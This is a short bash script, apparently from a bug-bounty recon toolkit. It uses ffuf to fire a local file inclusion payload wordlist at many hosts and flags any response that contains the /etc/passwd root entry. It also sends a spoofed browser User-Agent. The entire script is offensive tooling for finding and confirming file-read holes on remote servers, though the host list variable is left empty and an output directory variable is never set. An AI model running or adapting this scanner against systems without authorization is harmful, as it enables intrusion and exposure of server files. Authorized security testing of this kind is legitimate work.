#!/bin/bash

CUSTOMHEADER='X-HackerOne-Research:storenth'
REQUESTSPERSECOND=2
NUMBEROFTHREADS=20

CUSTOMLFIQUERYLIST=
LFIPAYLOAD=./wordlist/lfi-payload.txt

echo "[$(date | awk '{ print $4}')] [LFI] ffuf with all live servers with lfi-path-list using wordlist/LFI-payload.txt..."
    # simple math to watch progress
    HOSTCOUNT=$(< $CUSTOMLFIQUERYLIST wc -l)
    ENDPOINTCOUNT=$(< $LFIPAYLOAD wc -l)
    echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
    echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
    ffuf -s -timeout 5 -u HOSTPATH \
            -w $CUSTOMLFIQUERYLIST:HOST \
            -w $LFIPAYLOAD:PATH \
            -mr "root:[x*]:0:0:" \
            -H "$CUSTOMHEADER" \
            -t "$NUMBEROFTHREADS" \
            -rate "$REQUESTSPERSECOND" \
            -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
            -o $TARGETDIR/ffuf/lfi-matched-url.html -of html -or true > /dev/null
echo "[$(date | awk '{ print $4}')] [LFI] done."
